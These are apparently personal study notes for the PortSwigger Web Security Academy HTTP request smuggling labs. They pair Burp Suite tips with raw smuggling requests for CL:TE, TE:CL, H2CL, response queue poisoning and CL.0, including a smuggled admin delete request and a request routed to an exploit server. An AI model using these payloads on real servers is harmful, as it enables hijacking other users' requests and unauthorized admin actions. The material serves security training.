---
description: Request Smuggling Practitioner Labs Notes
---

# 🏴☠ RequestSmuggling

* Launch Smuggle Probe and H2 Probe. Might miss CL.0
* Try sending extra fast request, ctrl+space
  * Make a separate tab in repeater and spam to see weird requests
    * Should happen within 10 seconds of holding down request
* Double check endings of smuggled request
  * You need to include the trailing sequence `\r\n\r` following the final 0. TE:CL
* Make sure content-length is appropriate for attack and doesn't eat into the smuggled request

### CL:TE Diff Response Testing

* Don't count the 0 that ends the chunk in the leading hex number(byte count)

```
POST / HTTP/1.1
Host: 0aff001903b2238cc1550dd0002a001b.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 46
Transfer-Encoding: chunked

b
q=smuggling
0

GET /404 HTTP/1.1
Foo: X
```

### TE:CL Differential Response Testing

* Two Trailing NewLines
* Content-Length: 4 for the initial Request header (assuming two digit hex number payload)
  * disable update content-length in repeater
* Hex number to start POST payload = Following bytes-7
  * States the bytelength of upcoming "chunk"
  * Starting from Following HTTP Method to include the last newline

```
POST / HTTP/1.1
Host: 0ada00f40447df13c3aec9dc00bf0037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9f
POST /404 HTTP/1.1
Host: 0ada00f40447df13c3aec9dc00bf0037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

#### Capturing Request in Comment

* Spam requests until you get two normal responses in a row
  * Means request was sent in between
  * START SHORT then lengthen content-length
    * Use headers to simplify padding to avoid 500/400 errors when repeating
    * Smuggling req content-length can start corrupting 3rd request for smuggle
      * Should only have two different responses

### H2 Settings

* Launch H2 Smuggle Probe to scan
  * Won't show up through normal active scan
* Repeater Options disable Update Content Length
* Repeater Options enable Allow HTTP/2 ALPN override
* Inspector -> Request Attributes -> Protocol HTTP/2
* Remove any weird `:HEADER Value` that Burp may have added when testing
* Test full exploit on self, especially if poisoning for XSS
  * Quick refresh and send very necessary

**H2CL**

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1 
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net 
Content-Length: 5 

x=1
```

**Inspector tab of editing H2 Header for CRLF**

!\[\[CRLF Injection in H2C.png]]

### Response Queue Poisoning

* More cookies
* Repeat the poisoning request until response is interesting (may take spamming)

```
POST / HTTP/2
Host: 0a0500b303418726c3414233008400b2.web-security-academy.net
Cookie: session=aNKjt644Drm0JgFqrdvkYm1yWY3GjLCi
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Transfer-Encoding: chunked
Content-Length: 91

0

GET /404 HTTP/1.1
Host: 0a0500b303418726c3414233008400b2.web-security-academy.net

```

* Also possible in HTTP/2 Headers
  * May break the website formatting? stay frosty !\[\[Request Splitting H2 Headers.png]]

### CL.0

* Endpoint specific vulnerability
* Send group in sequence, single connection.
* Connection: keep-alive
* Request 1

```
POST /resources/images/blog.svg HTTP/1.1
Host: 0acc000204a8e462c1707b3e00c00090.web-security-academy.net
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0acc000204a8e462c1707b3e00c00090.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: Keep-alive
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

* Request 2 is just a valid request
  * may not be necessary during testing?
* Similar technique may work with Host header to bypass endpoint restrictions
